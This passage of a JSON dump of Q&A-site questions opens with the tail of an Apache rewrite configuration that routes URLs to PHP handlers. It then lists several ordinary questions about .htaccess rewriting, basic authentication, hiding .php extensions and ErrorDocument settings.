engine/handlers/service_handler.php?handler=$1&amp;request=$2&amp;%{QUERY_STRING}\n\nRewriteRule ^export\\/([A-Za-z]+)\\/([0-9]+)\\/?$ engine/handlers/export_handler.php?view=$1&amp;guid=$2\nRewriteRule ^export\\/([A-Za-z]+)\\/([0-9]+)\\/([A-Za-z]+)\\/([A-Za-z0-9\\_]+)\\/$ engine/handlers/export_handler.php?view=$1&amp;guid=$2&amp;type=$3&amp;idname=$4\n\nRewriteRule xml-rpc.php engine/handlers/xml-rpc_handler.php\nRewriteRule mt/mt-xmlrpc.cgi engine/handlers/xml-rpc_handler.php\n\n\n# rule for rewrite module test during install - can be removed after installation\nRewriteRule ^rewrite.php$ install.php\n\n# Everything else that isn't a file gets routed through the page handler\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([A-Za-z0-9\\_\\-]+)$ engine/handlers/page_handler.php?handler=$1 [QSA]\n\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([A-Za-z0-9\\_\\-]+)\\/(.*)$ engine/handlers/page_handler.php?handler=$1&amp;page=$2 [QSA]\n\n\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["wordpress",".htaccess","mod-rewrite","basic-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":117,"score":1,"question_id":12203989,"title":".htaccess, mod_rewrite, and basic authentication","body":"<p>I am working on a Wordpress site, and my pages are using a permalink structure that mod_rewrites them to look like directories. For a few pages I want to use Basic Authentication to password protect a few of the pages. How would I write this in my .htaccess file? Am I protecting the file, or the rewritten address?</p>\n"},{"tags":["php","regex",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":59,"score":-1,"question_id":12200178,"title":"URL Rewrite with htaccess and PHP","body":"<p>I have a URL: search/?word=asdf and want to redirect to: search/word/asdf/ and running internally:  ?cmd=search&amp;word=asdf</p>\n\n<p>This so you can get the PHP $ _GET ['cmd'] and $ _GET ['word'].</p>\n\n<p>How to do it in htaccess?</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>My .htaccess now is:</p>\n\n<pre><code>RewriteRule search(.*) %{HTTP_REFERER}cmd/search$1\nRewriteRule cmd/search/?key-word=(.*) %{HTTP_REFERER}cmd/search/key-word/$1\n</code></pre>\n\n<p>But this not working. The new URL ever is:\nlocalhost/bruc/sandbox/electrolux/trunk/cmd/search/?key-word=asdf </p>\n\n<p>But it should be: localhost/bruc/sandbox/electrolux/trunk/cmd/search/key-word/asdf </p>\n\n<p>So, I redirect this correct URL to: localhost/bruc/sandbox/electrolux/trunk/?cmd=search&amp;key-word=asdf</p>\n\n<p>But not working fine! Try, my approach here: <a href=\"http://htaccess.madewithlove.be/\" rel=\"nofollow\">http://htaccess.madewithlove.be/</a></p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":3,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12203953,"title":"How to get rid of .php extension in .htaccess","body":"<p>I am trying to do a <code>mod-rewrite</code> in my <code>.htaccess</code> to get rid of the \".php\" file extension.</p>\n\n<p>So basically, here is my site right now: <a href=\"http://www.example.com/about.php\" rel=\"nofollow\">http://www.example.com/about.php</a></p>\n\n<p>Here is what I want it to be: <a href=\"http://www.example.com/about\" rel=\"nofollow\">http://www.example.com/about</a></p>\n\n<p>Is there a way to do this in my .htaccess using <code>mod-rewrite</code>? Thanks so much!</p>\n"},{"tags":["apache",".htaccess","amazon-ec2","amazon-web-services","apache-config"],"answer_count":2,"favorite_count":3,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12202387,"title":".htaccess not working apache","body":"<p>I have a server from amazon's ec2 service running on linux ubuntu and I have installed apache, php, and mysql. I have added a .htaccess file in my document root <code>/var/www/html</code>. I entered this code in it: \n<code>ErrorDocument 400 /var/www/html/404.php</code> and it is still not showing up. I kept entered this command multiple times: <code>sudo service httpd restart</code> to restart the server but no changes displayed... How can I fix this... Did I do something wrong? Thanks in advance!</p>\n"}]}
